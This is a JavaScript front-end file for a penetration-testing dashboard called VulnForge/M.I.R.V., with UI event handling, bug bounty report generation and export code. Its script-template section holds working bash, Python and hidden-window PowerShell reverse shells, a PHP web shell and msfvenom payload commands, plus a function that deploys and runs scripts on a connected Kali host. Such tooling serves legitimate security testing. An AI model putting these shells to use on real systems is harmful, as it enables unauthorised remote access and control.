        const body = header.nextElementSibling;
        const arrow = header.querySelector('span:first-child');
        if (body.style.display === 'none') {
            body.style.display = '';
            arrow.textContent = '▶';
        } else {
            body.style.display = 'none';
            arrow.textContent = '▼';
        }
    };

    window.toggleAllCategories = function () {
        const headers = document.querySelectorAll('.cat-header');
        const masterIcon = document.getElementById('master-toggle-icon');
        const masterText = document.getElementById('master-toggle-text');
        let anyHidden = false;
        headers.forEach(h => {
            const body = h.nextElementSibling;
            if (!body) return;
            if (body.style.display === 'none') anyHidden = true;
        });
        const shouldExpand = anyHidden;
        headers.forEach(h => {
            const body = h.nextElementSibling;
            if (!body) return;
            const arrow = h.querySelector('span:first-child');
            body.style.display = shouldExpand ? '' : 'none';
            if (arrow) arrow.textContent = shouldExpand ? '▶' : '▼';
        });
        if (masterIcon) masterIcon.textContent = shouldExpand ? '▼' : '▶';
        if (masterText) masterText.textContent = shouldExpand ? 'Collapse All' : 'Expand All';
    };

    window.collapseAllCategories = function () {
        const headers = document.querySelectorAll('.cat-header');
        headers.forEach(h => {
            const body = h.nextElementSibling;
            if (!body) return;
            body.style.display = 'none';
            const arrow = h.querySelector('span:first-child');
            if (arrow) arrow.textContent = '▼';
        });
        const masterIcon = document.getElementById('master-toggle-icon');
        const masterText = document.getElementById('master-toggle-text');
        if (masterIcon) masterIcon.textContent = '▶';
        if (masterText) masterText.textContent = 'Expand All';
    };

    // ============================================================
    //  EVENT DELEGATION SYSTEM (Modern addEventListener)
    // ============================================================
    // Centraliza todos los eventos de la UI. Reemplaza onclick en HTML.
    // Usa data-* attributes + event delegation para performance y claridad.
    // ============================================================

    const ACTION_MAP = {
        // ── Navigation ──
        'tab':            (el) => { if (window.switchTab) switchTab(el.dataset.tab); },

        // ── Sidebar ──
        'sidebar':        ()   => { if (window.toggleSidebar) toggleSidebar(); },
        'theme':          ()   => { if (window.toggleTheme) toggleTheme(); },
        'lang':           ()   => { if (window.switchLanguage) switchLanguage(); },
        'toggle-category':(el) => { if (window.toggleCategory) toggleCategory(el); },
        'toggle-all':     ()   => { if (window.toggleAllCategories) toggleAllCategories(); },
        'run-all':        (el) => { if (window.runAllInCategory) runAllInCategory(el.dataset.category); },

        // ── Connection ──
        'add-conn':       ()   => { if (window.showAddConnection) showAddConnection(); },
        'del-conn':       ()   => { if (window.deleteActiveConnection) deleteActiveConnection(); },
        'disconnect':     ()   => { if (window.disconnectConn) disconnectConn(); },
        'save-conn':      ()   => { if (window.saveConnection) saveConnection(); },
        'cancel-conn':    ()   => { if (window.toggleAddConnection) toggleAddConnection(); },

        // ── Terminal ──
        'clear-terminal': ()   => { if (window.clearTerminal) clearTerminal(); },
        'stop-cmd':       ()   => { if (window.stopCommand) stopCommand(); },
        'file-upload':    ()   => { const inp = document.getElementById('file-upload-input'); if (inp) inp.click(); },

        // ── Reports ──
        'generate-report':()   => { if (window.generateReport) generateReport(); },
        'export-reports': ()   => { if (window.exportAllReports) exportAllReports(); },
        'clear-reports':  ()   => { if (window.clearReports) clearReports(); },
        'reports-ask-ai': ()   => { if (window.reportsAskAI) reportsAskAI(); },
        'export-report':  ()   => { if (window.exportCurrentReport) exportCurrentReport(); },
        'close-modal':    ()   => { if (window.closeReportModal) closeReportModal(); },
        'report-view':    (el) => { const i = parseInt(el.dataset.idx); if (!isNaN(i) && window.viewReport) viewReport(i); },
        'report-delete':  (el) => { const i = parseInt(el.dataset.idx); if (!isNaN(i) && window.deleteReport) deleteReport(i); },
        'report-export':  (el) => { /* handled via change event delegation */ },

        // ── Scripts ──
        'deploy':         ()   => { if (window.deployScript) deployScript(); },
        'save-script':    ()   => { if (window.saveScript) saveScript(); },
        'load-script':    ()   => { if (window.loadScript) loadScript(); },
        'ai-script':      ()   => { if (window.aiGenerateScript) aiGenerateScript(); },

        // ── Bounty ──
        'gen-bounty':     ()   => { if (window.generateBountyReport) generateBountyReport(); },
        'ai-bounty':      ()   => { if (window.aiEnhanceBounty) aiEnhanceBounty(); },
        'dl-bounty':      ()   => { if (window.downloadBountyReport) downloadBountyReport(); },

        // ── AI Writeup ──
        'gen-aiwriteup':  ()   => { if (window.generateAIWriteup) generateAIWriteup(); },
        'dl-aiwriteup':   ()   => { if (window.downloadAIWriteup) downloadAIWriteup(); },

        // ── Payload Studio ──
        'ps-creds':       ()   => { if (window.togglePSCreds) togglePSCreds(); },
        'ps-disconnect':  ()   => { if (window.disconnectPayloadStudio) disconnectPayloadStudio(); },
        'ps-login':       ()   => { if (window.doPayloadStudioLogin) doPayloadStudioLogin(); },

        // ── Hak5 ──
        'save-hak5':      ()   => { if (window.saveHak5Payload) saveHak5Payload(); },
        'load-hak5':      ()   => { if (window.loadHak5Payload) loadHak5Payload(); },
        'list-hak5':      ()   => { if (window.listHak5Payloads) listHak5Payloads(); },
        'clear-hak5':     ()   => { if (window.clearHak5Editor) clearHak5Editor(); },
        'ai-hak5':        ()   => { if (window.aiGeneratePayload) aiGeneratePayload(); },

        // ── n8n ──
        'n8n-status':     ()   => { if (window.checkN8nStatus) checkN8nStatus(); },
        'n8n-trigger':    ()   => { if (window.triggerN8nScan) triggerN8nScan(); },
        'n8n-workflow':   ()   => { if (window.aiGenerateWorkflow) aiGenerateWorkflow(); },
        'n8n-clear':      ()   => { if (window.clearN8nLog) clearN8nLog(); },
        'auto-ask-ai':    ()   => { if (window.automationAskAI) automationAskAI(); },

        // ── Op Admiral ──
        'clear-plan':     ()   => { if (window.clearPlan) clearPlan(); },
        'gen-plan':       ()   => { if (window.generatePlan) generatePlan(); },
        'exec-plan':      ()   => { if (window.executeAllSteps) executeAllSteps(); },
        'save-mission':   ()   => { if (window.saveMission) saveMission(); },
        'load-missions':  ()   => { if (window.loadMissionHistory) loadMissionHistory(); },
        'plan-copy-cmd':  (el) => { const i = parseInt(el.dataset.idx); if (!isNaN(i) && window.copyPlanCommand) copyPlanCommand(i); },
        'plan-exec-step': (el) => { const i = parseInt(el.dataset.idx); if (!isNaN(i) && window.executeStep) executeStep(i); },
        'view-mission':   (el) => { const id = el.dataset.missionId; if (id && window.viewMissionDetails) viewMissionDetails(id); },

        // ── Swarm ──
        'swarm-refresh':  ()   => { if (window.swarmRefresh) swarmRefresh(); },
        'swarm-clear':    ()   => { if (window.swarmClear) swarmClear(); },
        'swarm-start':    ()   => { if (window.swarmStart) swarmStart(); },
        'swarm-cancel':   ()   => { if (window.swarmCancel) swarmCancel(); },

        // ── Findings ──
        'clear-findings': ()   => { if (window.clearFindings) clearFindings(); },
        'export-findings':()   => { if (window.exportFindings) exportFindings(); },
        'suggest':        ()   => { if (window.suggestNextStep) suggestNextStep(); },
        'use-ai-config':  ()   => { if (window.loadAIConfigToSuggest) loadAIConfigToSuggest(); },
        'clear-suggestions':() => { if (window.clearSuggestions) clearSuggestions(); },
        'copy-clipboard': (el) => { if (window.copyToClipboard) copyToClipboard(el); },

        // ── Scope ──
        'scope':          ()   => { if (window.scopeModalOpen) scopeModalOpen(); },
        'scope-close':    ()   => { if (window.scopeModalClose) scopeModalClose(); },
        'scope-save':     ()   => { if (window.scopeSaveConfig) scopeSaveConfig(); },
        'scope-clear':    ()   => { if (window.scopeClearHistory) scopeClearHistory(); },

        // ── OPSEC ──
        'opsec':          ()   => { if (window.opsecModalOpen) opsecModalOpen(); },
        'opsec-close':    ()   => { if (window.opsecModalClose) opsecModalClose(); },
        'opsec-save':     ()   => { if (window.opsecSave) opsecSave(); },

        // ── Docker ──
        'docker':         ()   => { if (window.dockerModalOpen) dockerModalOpen(); },
        'docker-start':   ()   => { if (window.dockerStart) dockerStart(); },
        'docker-stop':    ()   => { if (window.dockerStop) dockerStop(); },
        'docker-clean':   ()   => { if (window.dockerClean) dockerClean(); },
        'docker-build':   ()   => { if (window.dockerBuild) dockerBuild(); },
        'docker-close':   ()   => { if (window.dockerModalClose) dockerModalClose(); },

        // ── Forensics ──
        'forensics-upload':() => { if (window.forensicsUpload) forensicsUpload(); },
        'forensics-ask-ai':() => { if (window.forensicsAskAI) forensicsAskAI(); },

        // ── Mobile ──
        'mobile-upload':  ()   => { if (window.mobileUpload) mobileUpload(); },
        'mobile-list':    ()   => { if (window.mobileListDevices) mobileListDevices(); },
        'mobile-run':     ()   => { if (window.mobileRunFrida) mobileRunFrida(); },
        'mobile-stop':    ()   => { if (window.mobileStopFrida) mobileStopFrida(); },
        'mobile-clear':   ()   => { if (window.mobileClearFridaOutput) mobileClearFridaOutput(); },
        'mobile-ask-ai':  ()   => { if (window.mobileAskAI) mobileAskAI(); },

        // ── Credentials ──
        'cred-add':       ()   => { if (window.credAdd) credAdd(); },
        'cred-ask-ai':    ()   => { if (window.credAskAI) credAskAI(); },
        'cred-clear':     ()   => { if (window.credClearAll) credClearAll(); },

        // ── CTF ──
        'ctf-add':        ()   => { if (window.ctfAdd) ctfAdd(); },
        'ctf-ask-ai':     ()   => { if (window.ctfAskAI) ctfAskAI(); },

        // ── KnowledgeBase ──
        'kb-search':      ()   => { if (window.kbSearch) kbSearch(); },
        'kb-ask-ai':      ()   => { if (window.kbAskAI) kbAskAI(); },
        'kb-clear':       ()   => { const inp = document.getElementById('kb-query'); if (inp) { inp.value = ''; if (window.kbSearch) kbSearch(); } },
    };

    function initEventListeners() {
        // Delegación principal: un solo listener en document.body captura todos los clicks
        const root = document.body || document.documentElement;
        if (!root) return;

        root.addEventListener('click', (e) => {
            // ── data-action buttons ──
            const actionEl = e.target.closest('[data-action]');
            if (actionEl) {
                const action = actionEl.dataset.action;
                const handler = ACTION_MAP[action];
                if (handler) {
                    handler(actionEl);
                    e.preventDefault();
                    return;
                }
            }

            // ── data-tool buttons (arsenal tool buttons) ──
            const toolBtn = e.target.closest('[data-tool]');
            if (toolBtn) {
                const toolId = toolBtn.dataset.tool;
                if (toolId && window.launchTool) {
                    launchTool(toolId);
                    e.preventDefault();
                    return;
                }
            }

            // ── data-tab buttons ──
            const tabBtn = e.target.closest('[data-tab]');
            if (tabBtn && !tabBtn.closest('[data-action]')) {
                const tab = tabBtn.dataset.tab;
                if (tab && window.switchTab) {
                    switchTab(tab);
                    e.preventDefault();
                    return;
                }
            }

            // ── data-script buttons (script templates) ──
            const scriptBtn = e.target.closest('[data-script]');
            if (scriptBtn) {
                const tmpl = scriptBtn.dataset.script;
                if (tmpl && window.selectScriptTemplate) {
                    selectScriptTemplate(tmpl);
                    e.preventDefault();
                    return;
                }
            }

            // ── data-device buttons (Hak5 device switcher) ──
            const deviceBtn = e.target.closest('[data-device]');
            if (deviceBtn) {
                const device = deviceBtn.dataset.device;
                if (device && window.switchHak5Device) {
                    switchHak5Device(device);
                    e.preventDefault();
                    return;
                }
            }
        });

        // Delegación de cambio (change) para selects con data-action="report-export"
        root.addEventListener('change', (e) => {
            const sel = e.target.closest('select[data-action="report-export"]');
            if (sel) {
                const idx = parseInt(sel.dataset.idx);
                if (!isNaN(idx) && sel.value && window.exportReport) {
                    exportReport(idx, sel.value);
                    sel.value = ''; // reset after export
                    e.preventDefault();
                }
            }
        });
    }

    // ============================================================
    //  SCRIPT BUILDER — Templates
    // ============================================================
    const SCRIPT_TEMPLATES = {
        'blank': { lang: 'bash', content: '#!/bin/bash\n\n# Your payload here\n' },

        'bash-rev': { lang: 'bash', content: `#!/bin/bash
# Bash Reverse Shell
# Usage: ./script.sh <LHOST> <LPORT>

LHOST="\${1:-10.10.14.x}"
LPORT="\${2:-4444}"

bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1
` },

        'python-rev': { lang: 'python', content: `#!/usr/bin/env python3
# Python3 Reverse Shell
# Usage: python3 script.py <LHOST> <LPORT>

import sys, socket, subprocess, os

LHOST = sys.argv[1] if len(sys.argv) > 1 else "10.10.14.x"
LPORT = int(sys.argv[2]) if len(sys.argv) > 2 else 4444

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((LHOST, LPORT))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
import pty
pty.spawn("/bin/bash")
` },

        'php-webshell': { lang: 'php', content: `<?php
// PHP WebShell
// Upload to target and access: http://target/shell.php?cmd=whoami

if (isset($_REQUEST['cmd'])) {
    $cmd = $_REQUEST['cmd'];
    echo "<pre>" . shell_exec($cmd) . "</pre>";
}
?>` },

        'powershell-rev': { lang: 'powershell', content: `# PowerShell Reverse Shell
# Run: powershell -NoP -NonI -W Hidden -Exec Bypass -f script.ps1

$LHOST = "10.10.14.x"
$LPORT = 4444

$c = New-Object System.Net.Sockets.TCPClient($LHOST, $LPORT);
$s = $c.GetStream();
[byte[]]$b = 0..65535|%{0};
while(($i = $s.Read($b, 0, $b.Length)) -ne 0) {
    $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);
    $sb = (iex $d 2>&1 | Out-String );
    $sb2 = $sb + "PS " + (pwd).Path + "> ";
    $sbt = ([text.encoding]::ASCII).GetBytes($sb2);
    $s.Write($sbt,0,$sbt.Length);
    $s.Flush()
}
$c.Close()
` },

        'msfvenom': { lang: 'bash', content: `#!/bin/bash
# Msfvenom Payload Generator
# Usage: ./gen.sh <LHOST> <LPORT> <TYPE>

LHOST="\${1:-10.10.14.x}"
LPORT="\${2:-4444}"
TYPE="\${3:-linux}"

case $TYPE in
    linux)
        msfvenom -p linux/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf -o rev_shell.elf
        ;;
    windows)
        msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o rev_shell.exe
        ;;
    php)
        msfvenom -p php/reverse_php LHOST=$LHOST LPORT=$LPORT -f raw -o rev_shell.php
        ;;
    python)
        msfvenom -p python/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f raw -o rev_shell.py
        ;;
    *)
        echo "Usage: \$0 <LHOST> <LPORT> <linux|windows|php|python>"
        ;;
esac
echo "[+] Payload generated: rev_shell.\$TYPE"
` }
    };

    let savedScripts = [];

    function loadSavedScripts() {
        // Try DB first
        if (window.DataService && DataService.available) {
            DataService.listScripts().then(list => {
                if (list && list.length > 0) {
                    savedScripts = list;
                    localStorage.setItem('vulnforge_scripts', JSON.stringify(list));
                    return;
                }
                _loadScriptsLocal();
            }).catch(() => _loadScriptsLocal());
        } else {
            _loadScriptsLocal();
        }
    }

    function _loadScriptsLocal() {
        try {
            const stored = localStorage.getItem('vulnforge_scripts');
            savedScripts = stored ? JSON.parse(stored) : [];
        } catch { savedScripts = []; }
    }

    function saveSavedScripts() {
        localStorage.setItem('vulnforge_scripts', JSON.stringify(savedScripts));
        // Sync to DB in background
        if (window.DataService && DataService.available) {
            savedScripts.forEach(s => {
                if (!s._dbSynced) {
                    DataService.saveScript({
                        name: s.name,
                        content: s.content,
                        language: s.language || 'bash'
                    }).then(r => {
                        if (r) s._dbSynced = true;
                    }).catch(() => {});
                }
            });
        }
    }

    window.selectScriptTemplate = function (name) {
        // Update active button
        document.querySelectorAll('.script-template-btn').forEach(b => b.classList.remove('active'));
        event.target.classList.add('active');

        const tmpl = SCRIPT_TEMPLATES[name];
        if (tmpl) {
            scriptEditor.value = tmpl.content;
            document.getElementById('script-lang').textContent = tmpl.lang;
            document.getElementById('script-line-count').textContent = getLineCount(tmpl.content);
            if (!scriptName.value) scriptName.value = name + '.sh';
        }
    };

    window.deployScript = function () {
        if (!ensureConnected()) return;

        const content = scriptEditor.value.trim();
        const name = scriptName.value.trim() || 'payload.sh';
        if (!content) {
            alert('⚠️  Script editor is empty.');
            return;
        }

        // Show deploy log
        deployLog.classList.remove('hidden');
        deployLogText.textContent = '';

        // Escape content for SSH echo
        const escaped = content
            .replace(/\\/g, '\\\\')
            .replace(/`/g, '\\`')
            .replace(/\$/g, '\\$')
            .replace(/"/g, '\\"');

        // Write to file on Kali, make executable, and run
        const cmd = `echo "${escaped}" > /tmp/${name} && chmod +x /tmp/${name} && echo "[+] Written to /tmp/${name}"`;

        deployLogText.textContent += `> Writing script to /tmp/${name}...\n`;
        appendOutput(`\n[*] Deploying script: ${name}`);

        // First write
        ws.send(cmd);

        // Ask if execute
        setTimeout(() => {
            if (confirm(`🚀 Script written to /tmp/${name}.\n\nExecute it now?`)) {
                const execCmd = `cd /tmp && ./${name}`;
                deployLogText.textContent += `> Executing: ${execCmd}\n`;
                appendOutput(`[*] Executing: ${execCmd}`);
                ws.send(execCmd);
            } else {
                deployLogText.textContent += `> Ready at /tmp/${name}\n`;
                appendOutput(`[*] Script saved to /tmp/${name} (not executed)`);
            }
        }, 500);

        showToast(`⬆ Script "${name}" deployed`);
    };

    window.saveScript = function () {
        const content = scriptEditor.value.trim();
        const name = scriptName.value.trim() || 'untitled.sh';
        if (!content) {
            alert('⚠️  Editor is empty.');
            return;
        }
        // Avoid duplicates
        const idx = savedScripts.findIndex(s => s.name === name);
        if (idx >= 0) savedScripts[idx].content = content;
        else savedScripts.push({ name, content, saved: new Date().toLocaleString() });

        saveSavedScripts();
        document.getElementById('script-status').textContent = `✓ saved "${name}"`;
        showToast(`💾 Script "${name}" saved`);
    };

    window.loadScript = function () {
        if (savedScripts.length === 0) {
            alert('📂 No saved scripts found.');
            return;
        }
        const list = savedScripts.map((s, i) => `${i + 1}. ${s.name} (${s.saved})`).join('\n');
        const choice = prompt(`📂 Saved scripts:\n\n${list}\n\nEnter number to load:`);
        const idx = parseInt(choice) - 1;
        if (idx >= 0 && idx < savedScripts.length) {
            const s = savedScripts[idx];
            scriptEditor.value = s.content;
            scriptName.value = s.name;
            document.getElementById('script-line-count').textContent = getLineCount(s.content);
            document.getElementById('script-status').textContent = `📂 loaded "${s.name}"`;
            showToast(`📂 Loaded "${s.name}"`);
        }
    };

    // Update line count on edit
    scriptEditor.addEventListener('input', () => {
        document.getElementById('script-line-count').textContent = getLineCount(scriptEditor.value);
    });

    // ============================================================
    //  BOUNTY REPORT GENERATOR
    // ============================================================
    let lastBountyReport = '';

    window.generateBountyReport = function () {
        const target      = document.getElementById('bounty-target').value.trim();
        const vulnType    = document.getElementById('bounty-type').value;
        const severity    = document.getElementById('bounty-severity').value;
        const component   = document.getElementById('bounty-component').value.trim();
        const description = document.getElementById('bounty-description').value.trim();
        const steps       = document.getElementById('bounty-steps').value.trim();
        const impact      = document.getElementById('bounty-impact').value.trim();
        const poc         = document.getElementById('bounty-poc').value.trim();
        const fix         = document.getElementById('bounty-fix').value.trim();

        if (!target) { alert('⚠️  Enter a target URL/IP'); return; }
        if (!description) { alert('⚠️  Enter a description'); return; }

        const date = new Date().toISOString().split('T')[0];
        const sevEmoji = { Critical: '🔴', High: '🟠', Medium: '🟡', Low: '🔵', Info: '⚪' };

        const report = `# 🛡️ Bug Bounty Report

**Target:** \`${target}\`
**Date:** ${date}
**Vulnerability:** ${vulnType}
**Severity:** ${sevEmoji[severity] || '•'} **${severity}**
**Reporter:** M.I.R.V. Dashboard

---

## 📋 Summary

${description}

## 🎯 Affected Component

\`${component || 'N/A'}\`

## 🔄 Steps to Reproduce

${steps || '1. Navigate to the target\n2. Perform the attack\n3. Observe the vulnerability'}

## 💥 Impact

${impact || 'An attacker could exploit this vulnerability to compromise the target system.'}

## 🧪 Proof of Concept

\`\`\`
${poc || 'See attached files or URLs'}
\`\`\`

## 🔧 Recommendation

${fix || 'Apply appropriate security patches and input validation.'}

---

*Report generated by **M.I.R.V.** — ${date}*
`;

        lastBountyReport = report;
        document.getElementById('bounty-preview').textContent = report;
        document.getElementById('btn-download-bounty').disabled = false;
        showToast('📋 Bounty report generated');
        // Save to DB
        _saveReportToDB({
            type: 'bounty',
            title: `Bug Bounty — ${vulnType}`,
            target: target,
            raw_output: report,
            format: 'md'
        });
    };

    // ============================================================
    //  EXPORT UTILITIES (MD / HTML / PDF)
    // ============================================================

    /**
     * Convert markdown-like text to basic HTML for export.
     */
    function mdToBasicHTML(text) {
        if (!text) return '<p>No content</p>';
        let html = text
            // Escape HTML entities first
            .replace(/&/g, '&amp;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;')
            // Code blocks (```...```)
            .replace(/```(\w*)\n([\s\S]*?)```/g, '<pre><code>$2</code></pre>')
            // Inline code
            .replace(/`([^`]+)`/g, '<code>$1</code>')
            // Headers
            .replace(/^### (.+)$/gm, '<h3>$1</h3>')
            .replace(/^## (.+)$/gm, '<h2>$1</h2>')
            .replace(/^# (.+)$/gm, '<h1>$1</h1>')
            // Bold / italic
            .replace(/\*\*(\S[^*]+)\*\*/g, '<strong>$1</strong>')
            .replace(/\*(\S[^*]+)\*/g, '<em>$1</em>')
            // Links
            .replace(/\[([^\]]+)\]\(([^)]+)\)/g, '<a href="$2">$1</a>')
            // Horizontal rules
            .replace(/^---$/gm, '<hr>')
            // List items
            .replace(/^- (.+)$/gm, '<li>$1</li>')
            // Line breaks
            .replace(/\n\n/g, '</p><p>')
            .replace(/\n/g, '<br>');
        return '<p>' + html + '</p>';
    }

    /**
     * Convert markdown text to HTML for inline display (suggestions).
     * Lighter than mdToBasicHTML — no <p> wrapper, supports numbered lists.
     */
    function mdToHTML(text) {
        if (!text) return '';
        let html = text
            // Escape HTML entities
            .replace(/&/g, '&amp;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;')
            // Inline code (backticks)
            .replace(/`([^`]+)`/g, '<code class="bg-deep text-neon px-1 rounded text-[10px]">$1</code>')
            // Bold
            .replace(/\*\*(\S[^*\n]+)\*\*/g, '<strong class="text-gray-100">$1</strong>')
            // Italic
            .replace(/\*(\S[^*\n]+)\*/g, '<em>$1</em>')
            // Numbered list: "1. text" or "1. **cmd:** text"
            .replace(/^(\d+)\.\s+(.+)$/gm, '<li class="ml-4 list-decimal text-gray-300 mb-1">$2</li>')
            // Bullet list: "- text"
            .replace(/^- (.+)$/gm, '<li class="ml-4 list-disc text-gray-300 mb-1">$1</li>')
            // Links
            .replace(/\[([^\]]+)\]\(([^)]+)\)/g, '<a href="$2" class="text-neon/80 underline underline-offset-2">$1</a>')
            // Horizontal rules
            .replace(/^---+$/gm, '<hr class="border-gray-800 my-2">')
            // Double newline = paragraph break
            .replace(/\n\n+/g, '</div><div class="mb-2">')
            // Single newline = line break
            .replace(/\n/g, '<br>');
        // Wrap in a container div (first opening tag added if content starts with <li>)
        if (html.startsWith('<li')) {
            html = '<ol class="list-inside">' + html + '</ol>';
        }
        return '<div class="mb-2">' + html + '</div>';
    }

    /**
     * Build a complete, self-contained HTML document for export or print preview.
     * @param {string}  content   - Raw markdown-like report text
     * @param {string}  title     - Document title
     * @param {string}  type      - 'bounty' | 'writeup' | 'scan'
     * @returns {string} Full HTML page
     */
    function buildExportHTML(content, title, type) {
        const bodyHtml = mdToBasicHTML(content);
        const date = new Date().toISOString().split('T')[0];
        return `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>${title} — M.I.R.V.</title>
<style>
  :root {
    --bg: #0d1117; --surface: #161b22; --border: #30363d;
    --text: #e6edf3; --text-dim: #8b949e; --accent: #58a6ff;
    --accent2: #3fb950; --font: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
    --mono: 'Fira Code', 'Cascadia Code', 'Consolas', monospace;
  }
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    background: var(--bg); color: var(--text); font-family: var(--font);
    padding: 40px 48px; line-height: 1.7; font-size: 14px;
  }
  .header {
    border-bottom: 1px solid var(--border); padding-bottom: 16px; margin-bottom: 24px;
    display: flex; align-items: center; justify-content: space-between;
  }
  .header h1 { font-size: 20px; font-weight: 700; color: var(--accent); }
  .header .meta { font-size: 12px; color: var(--text-dim); font-family: var(--mono); }
  .footer {
    margin-top: 40px; padding-top: 16px; border-top: 1px solid var(--border);
    font-size: 11px; color: var(--text-dim); text-align: center;
  }
  h1, h2, h3, h4 { color: var(--accent); margin: 20px 0 8px; font-weight: 600; }
  h1 { font-size: 22px; }
  h2 { font-size: 18px; border-bottom: 1px solid var(--border); padding-bottom: 4px; }
  h3 { font-size: 15px; }
  p { margin: 8px 0; }
  a { color: var(--accent); text-decoration: underline; }
  pre, code { font-family: var(--mono); background: var(--surface); border-radius: 4px; }
  code { padding: 1px 5px; font-size: 13px; }
  pre { padding: 12px 16px; overflow-x: auto; margin: 12px 0; border: 1px solid var(--border); font-size: 13px; line-height: 1.5; }
  pre code { padding: 0; background: none; }
  hr { border: none; border-top: 1px solid var(--border); margin: 20px 0; }
  li { margin: 4px 0 4px 20px; }
  strong { color: #f0f6fc; }
  @media print {
    body { background: #fff; color: #000; padding: 20px; }
    .header h1 { color: #1f6feb; }
    h1, h2, h3 { color: #1f6feb; }
    pre, code { background: #f6f8fa; border-color: #d0d7de; }
    a { color: #1f6feb; }
    strong { color: #000; }
    .footer { color: #6e7681; }
    @page { margin: 15mm; }
  }
</style>
</head>
<body>
  <div class="header">
    <h1>${title}</h1>
    <div class="meta">${date} · VulnForge</div>
  </div>
  ${bodyHtml}
  <div class="footer">
    Generated by <strong>VulnForge</strong> — ${date}
  </div>
</body>
</html>`;
    }

    /**
     * Open a print-friendly popup window for PDF export.
     * User chooses "Save as PDF" in the print dialog.
     */
    function openPDFPreview(htmlContent, title) {
        const win = window.open('', '_blank', 'width=900,height=700,scrollbars=yes');
        if (!win) {
            showToast('⚠️ Popup blocked — allow popups for PDF export');
            return;
        }
        win.document.write(htmlContent);
        win.document.title = title;
        win.document.close();
        win.focus();
        // Wait for fonts/images then print
        setTimeout(() => {
            win.print();
        }, 500);
    }

    /**
     * Generic file download using Blob.
     */
    function downloadString(content, filename, mimeType) {
        const blob = new Blob([content], { type: mimeType + ';charset=utf-8' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = filename;
        a.click();
        URL.revokeObjectURL(url);
    }

    /**
     * Export a raw report string as MD / HTML / PDF.
     * @param {string} content   - Raw markdown-like text
     * @param {string} filename  - Base filename (no extension)
     * @param {string} format    - 'md' | 'html' | 'pdf'
     * @param {string} title     - Pretty title for the report
     * @param {string} type      - 'bounty' | 'writeup' | 'scan'
     */
    function exportReport(content, filename, format, title, type) {
        const date = new Date().toISOString().split('T')[0];
        const safeName = filename.replace(/[^a-zA-Z0-9_-]/g, '_') || 'report';

        switch (format) {
            case 'md':
                downloadString(content, `${safeName}-${date}.md`, 'text/markdown');
                break;
            case 'html': {
                const html = buildExportHTML(content, title, type);
                downloadString(html, `${safeName}-${date}.html`, 'text/html');
                break;
            }
            case 'pdf':
            case 'client-pdf': {
                const html = buildExportHTML(content, title, type);
                openPDFPreview(html, `${title} — ${date}`);
                break;
            }
            case 'pdf-server':
            case 'server-pdf': {
                // Try server-side PDF generation
                if (DataService && DataService.available) {
                    showToast('⚙ Generating PDF on server...');
                    DataService.generatePdf(content, title).then(blob => {
                        if (blob) {
                            DataService.downloadBlob(blob, `${safeName}-${date}.pdf`);
                            showToast('⬇ Server PDF generated');
                        } else {
                            showToast('⚠️ Server PDF failed, using client-side');
                            const html = buildExportHTML(content, title, type);
                            openPDFPreview(html, `${title} — ${date}`);
                        }
                    });
                } else {
                    // Fallback to client-side
                    showToast('⚠️ DB not available, using client-side PDF');
                    const html = buildExportHTML(content, title, type);
                    openPDFPreview(html, `${title} — ${date}`);
                }
                return; // async, toast handled inside
            }
        }
        showToast(`⬇ ${format.toUpperCase()} exported`);
    }

    // ── Updated Bounty Download ──
    window.downloadBountyReport = function () {
        if (!lastBountyReport) return;
        const target = document.getElementById('bounty-target').value.trim().replace(/[^a-zA-Z0-9]/g, '_') || 'report';
        const format = document.getElementById('bounty-format').value;
        const vulnType = document.getElementById('bounty-type').value;
        exportReport(lastBountyReport, `bug-bounty-${target}`, format, `Bug Bounty — ${vulnType}`, 'bounty');
    };

    // ── Updated AI Writeup Download ──
    window.downloadAIWriteup = function () {
        if (!lastAIWriteup) return;
        const machine = document.getElementById('ai-machine').value.trim().replace(/[^a-zA-Z0-9_-]/g, '_') || 'writeup';
        const format = document.getElementById('ai-format').value;
        exportReport(lastAIWriteup, `writeup-${machine}`, format, `Writeup — ${machine}`, 'writeup');
    };

    // ── Export single scan report ──
    window.exportScanReport = function (index, format) {
        const r = window.reports && window.reports[index];
        if (!r) { showToast('⚠️ Report not found'); return; }

        // Build a text report from the structured data
        let content = `# ${r.type.toUpperCase()} Scan Report\n\n`;
        content += `**Target:** \`${r.target}\`\n`;
        content += `**Date:** ${r.timestamp}\n`;
        content += `**Tool:** ${r.type}\n\n`;
        content += `---\n\n`;

        if (r.type === 'nmap' && r.ports) {
            content += `## Open Ports (${r.ports.length})\n\n`;
            content += `| Port | Protocol | Service | Version |\n`;
            content += `|------|----------|---------|--------|\n`;
            r.ports.forEach(p => {
                content += `| ${p.port} | ${p.protocol || 'tcp'} | ${p.service || '?'} | ${p.version || '-'} |\n`;
            });
            if (r.os) content += `\n**OS:** ${r.os}\n`;
            if (r.raw) content += `\n## Raw Output\n\n\`\`\`\n${r.raw.substring(0, 2000)}\n\`\`\`\n`;
        } else if (r.type === 'gobuster' && r.dirs) {
            content += `## Found Directories (${r.dirs.length})\n\n`;
            r.dirs.forEach(d => {
                content += `- [${d.status}] ${d.path}${d.size ? ` (${d.size})` : ''}\n`;
            });
            if (r.raw) content += `\n## Raw Output\n\n\`\`\`\n${r.raw.substring(0, 2000)}\n\`\`\`\n`;
        } else {
            content += r.raw || 'No data';
        }

        const title = `${r.type.toUpperCase()} — ${r.target}`;
        exportReport(content, `${r.type}-${r.target.replace(/[^a-zA-Z0-9]/g, '_')}`, format, title, 'scan');
    };

    // ============================================================
    //  AI WRITEUP GENERATOR
    // ============================================================
    let lastAIWriteup = '';

    // Load saved API config (tries backend first, falls back to localStorage migration)
    function loadAIConfig() {
        try {
            // Try loading AI key from backend (more secure — not in localStorage)
